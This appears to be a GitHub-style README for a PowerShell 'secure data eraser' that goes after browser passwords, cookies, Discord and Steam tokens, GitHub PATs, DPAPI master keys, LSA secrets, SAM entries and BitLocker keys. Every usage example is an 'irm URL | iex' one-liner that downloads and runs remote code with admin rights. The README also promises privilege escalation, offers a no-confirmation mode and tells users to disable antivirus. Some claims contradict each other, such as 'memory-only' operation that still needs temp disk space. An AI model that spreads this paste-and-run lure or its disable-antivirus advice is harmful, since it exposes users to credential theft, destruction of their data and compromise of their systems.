# Secure Windows 11 Data Eraser

**🔴 WARNING: This tool permanently deletes all credentials, passwords, and sensitive data. Use with extreme caution!**

## Quick Start

### One-Liner Execution (Recommended)
```powershell
irm "https://github.com/HOSTEDSCRIPT" | iex
```

### With Custom Options
```powershell
irm "https://github.com/HOSTEDSCRIPT" | iex -EncryptionRounds 5 -Verify -Force
```

## What This Tool Does

This comprehensive secure data eraser targets and permanently destroys:

### 🌐 Browser Credentials
- **Microsoft Edge** (Chromium): Login Data, Cookies, Web Data, Session Storage
- **Google Chrome**: All credential databases, cookies, session data
- **Mozilla Firefox**: logins.json, key4.db/key3.db, cookies.sqlite
- **Brave, Opera, Vivaldi**: Complete credential databases
- **Tor Browser**: All stored authentication data

### 🎮 Gaming & Application Tokens
- **Steam**: Login credentials, session tokens, app data
- **Spotify**: OAuth tokens, offline credentials, cache
- **Epic Games**: Login tokens, launcher cache
- **Discord**: LevelDB tokens, session data, cache
- **Battle.net, Origin, uPlay**: Complete authentication data
- **Adobe Creative Cloud**: Account credentials
- **Office 365**: Microsoft account sync data
- **GitHub/GitLab**: Personal Access Tokens
- **VS Code**: Extension tokens, authentication

### 🏢 Windows System Credentials
- **Windows Credential Manager**: All stored credentials
- **Windows Hello**: Biometric data, PIN storage, certificates
- **DPAPI**: Master keys, credential blobs
- **Active Directory**: Cached domain credentials
- **Microsoft Account**: OneDrive sync data, backup settings
- **Registry**: LSA secrets, SAM database entries
- **TPM**: BitLocker keys, hardware-anchored data

## Security Features

### 🔐 Multi-Round Encryption
- AES-256 encryption with cryptographically secure random keys
- Minimum 3 rounds (configurable 1-10)
- Each round uses a unique randomly generated 256-bit key
- Hardware RNG support when available

### 🛡️ Military-Grade Deletion
- **NIST 800-88 Rev.1** compliance
- **DoD 5220.22-M** 3-pass overwriting
- Random data + zero-pass patterns
- No recoverable data remnants

### 🔒 Deep System Access
- Administrative privilege escalation
- NTFS journaling manipulation
- Registry hive handling
- Shadow copy access
- Protected system file access
- LSA and Credential Guard compatibility

### ⚡ Performance Optimized
- Multi-threaded parallel processing
- Optimal thread pool configuration
- Memory-only operation (no temp files)
- Real-time progress tracking
- Efficient chunk-based processing

## Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-EncryptionRounds` | int | 3 | Number of encryption passes (1-10) |
| `-Verify` | switch | false | Verify complete deletion |
| `-Force` | switch | false | Skip user confirmation |
| `-Silent` | switch | false | Minimal output |

## Usage Examples

### Basic Secure Erasure
```powershell
# Run with default settings (3 encryption rounds)
irm "https://github.com/HOSTEDSCRIPT" | iex
```

### High Security Erasure
```powershell
# 5 encryption rounds with verification
irm "https://github.com/HOSTEDSCRIPT" | iex -EncryptionRounds 5 -Verify
```

### Force Mode (No Confirmation)
```powershell
# Skip user confirmation dialog
irm "https://github.com/HOSTEDSCRIPT" | iex -Force
```

### Silent Mode
```powershell
# Minimal output for automated use
irm "https://github.com/HOSTEDSCRIPT" | iex -Silent -EncryptionRounds 7
```

## System Requirements

- **Windows 11** (Primary target)
- **Administrative privileges** (Required)
- **PowerShell 5.1+** (Built into Windows 11)
- **4GB RAM** recommended for large-scale deletion
- **No internet required** after initial download

## Safety Features

- **Administrative privilege verification**
- **UAC compliance and elevation**
- **Comprehensive logging**
- **Error handling and recovery**
- **Dry-run capability** (in development)
- **Progress tracking and cancellation**

## What Gets Deleted

### Complete Browser Cleanup
- All saved passwords and login credentials
- Session cookies and authentication tokens
- Autofill data and form history
- Browser-specific encryption keys
- Cache and temporary files

### Application Token Removal
- OAuth 2.0 refresh tokens
- JWT session tokens
- Personal Access Tokens (PATs)
- Application-specific authentication data
- Local storage credentials

### Windows System Cleanup
- Credential Manager vault entries
- Windows Hello biometric templates
- DPAPI master keys and blobs
- Cached domain credentials
- Microsoft Account sync data
- System service credentials

## Security Guarantees

✅ **No Recovery Possible**: Military-grade deletion standards
✅ **Complete Coverage**: All major credential storage locations
✅ **Deep Access**: Beyond normal administrative rights
✅ **Audit Trail**: Detailed logging of all operations
✅ **Verification**: Optional verification of complete deletion
✅ **Memory Safe**: No sensitive data written to disk

## Post-Erasure Recommendations

1. **Restart the system** to clear memory-resident data
2. **Reinstall Windows 11** from clean media for maximum security
3. **Change all passwords** for accounts that may have been compromised
4. **Review security settings** and reconfigure as needed
5. **Update all applications** to latest versions

## Troubleshooting

### Permission Denied Errors
```powershell
# Run PowerShell as Administrator
# Right-click PowerShell → "Run as Administrator"
```

### UAC Prompts
The script will attempt automatic elevation. If it fails, manually run as Administrator.

### Large File Timeouts
```powershell
# Increase encryption rounds for smaller files, decrease for speed
irm "https://github.com/HOSTEDSCRIPT" | iex -EncryptionRounds 2
```

### Antivirus Interference
Some antivirus software may flag secure deletion tools. Temporarily disable real-time protection or add exclusions.

## Legal Disclaimer

This tool is intended for legitimate security purposes and personal data protection. Users are solely responsible for compliance with applicable laws and regulations. The authors are not liable for any data loss or system damage resulting from tool usage.

## Version History

- **v1.0** - Initial release with comprehensive browser and application targeting
- **v1.1** - Added Windows 11 specific optimizations and security features
- **v1.2** - Enhanced deep system access and privilege escalation

## Support

For issues or questions:
- Review the troubleshooting section
- Check administrative privileges
- Verify Windows 11 compatibility
- Ensure sufficient disk space for temporary operations

---

**Remember: This tool permanently destroys data. Ensure you have backups and understand the consequences before running!**